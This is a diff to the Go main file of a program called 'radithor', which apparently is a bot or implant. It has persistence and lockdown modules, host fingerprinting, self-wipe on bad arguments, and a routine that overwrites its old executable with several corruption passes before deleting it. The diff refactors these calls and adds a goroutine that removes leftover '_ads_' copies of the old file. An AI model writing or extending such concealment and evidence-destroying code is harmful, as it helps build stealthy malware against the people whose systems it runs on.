@@ -3,6 +3,7 @@ package main
 import (
 	"os"
 	"path/filepath"
+	"regexp"
 	"strconv"
 	"strings"
 	"time"
@@ -13,6 +14,7 @@ import (
 
 	"radithor/bot"
 	"radithor/core"
+	"radithor/core/core_funcs"
 	"radithor/core/lockdown"
 	"radithor/core/persistence"
 	"radithor/funcs"
@@ -70,7 +72,7 @@ func main() {
 
 	default:
 		core.LogError("[main] unexpected args: (%d), %v", argc, argv)
-		core.Wipe(false)
+		core_funcs.Wipe(false)
 	}
 }
 
@@ -158,7 +160,7 @@ func setup(savedState patch.SavedState) {
 	savedState.InitDone = true
 
 	if config.GetConfigAny[bool](store.AGGRESSIVE_LAUNCH_CHECKS) {
-		fingerprint, err := core.GenerateFingerprint()
+		fingerprint, err := core_funcs.GenerateFingerprint()
 		if err != nil {
 			core.LogError("[setup] failed to generate fingerprint - %v", err)
 			os.Exit(0)
@@ -237,7 +239,9 @@ func firstStart(argv []string) {
 
 	time.Sleep(500 * time.Millisecond)
 
-	info, err := os.Stat(argv[_ARGS_IDX_PATH_TO_DELETE])
+	oldFilePath := argv[_ARGS_IDX_PATH_TO_DELETE]
+
+	info, err := os.Stat(oldFilePath)
 	if err != nil || info.IsDir() {
 		core.LogError("[firstStart] path to delete is a dir or stat return error - %v", err)
 		os.Exit(0)
@@ -248,7 +252,7 @@ func firstStart(argv []string) {
 			core.LogWarning("failed to delete old file")
 		}
 
-		err = utils.CorruptFile(argv[_ARGS_IDX_PATH_TO_DELETE], _OLD_FILE_CORRUPT_PASSES)
+		err = utils.CorruptFile(oldFilePath, _OLD_FILE_CORRUPT_PASSES)
 		if err != nil {
 			time.Sleep(500 * time.Millisecond)
 			continue
@@ -256,7 +260,7 @@ func firstStart(argv []string) {
 
 		core.LogInfo("[firstStart] corrupted old file with %d passes on %d try", _OLD_FILE_CORRUPT_PASSES, i+1)
 
-		err = os.Remove(argv[_ARGS_IDX_PATH_TO_DELETE])
+		err = os.Remove(oldFilePath)
 		if err != nil {
 			time.Sleep(500 * time.Millisecond)
 			continue
@@ -281,11 +285,36 @@ func firstStart(argv []string) {
 		core.SavePersistenConfig()
 	}
 
+	// since for some reason utils.CopyFile() donst delete it
+	go func() {
+		oldDir := filepath.Dir(oldFilePath)
+		oldFileName := filepath.Base(oldFilePath)
+
+		items, err := os.ReadDir(oldDir)
+		if err != nil {
+			return
+		}
+
+		pattern := regexp.MustCompile("^" + regexp.QuoteMeta(oldFileName) + "_ads_[^_]+_[0-9a-f]{12}$")
+
+		for _, item := range items {
+			if item.IsDir() {
+				continue
+			}
+
+			if !pattern.MatchString(item.Name()) {
+				continue
+			}
+
+			os.Remove(filepath.Join(oldDir, item.Name()))
+		}
+	}()
+
 	bot.StartBot()
 }
 
 func checkCanLaunch(savedState patch.SavedState) bool {
-	fingerprint, err := core.GenerateFingerprint()
+	fingerprint, err := core_funcs.GenerateFingerprint()
 	if err != nil {
 		core.LogError("[checkCanLaunch] failed to generate fingerprint - %v", err)
 		return false
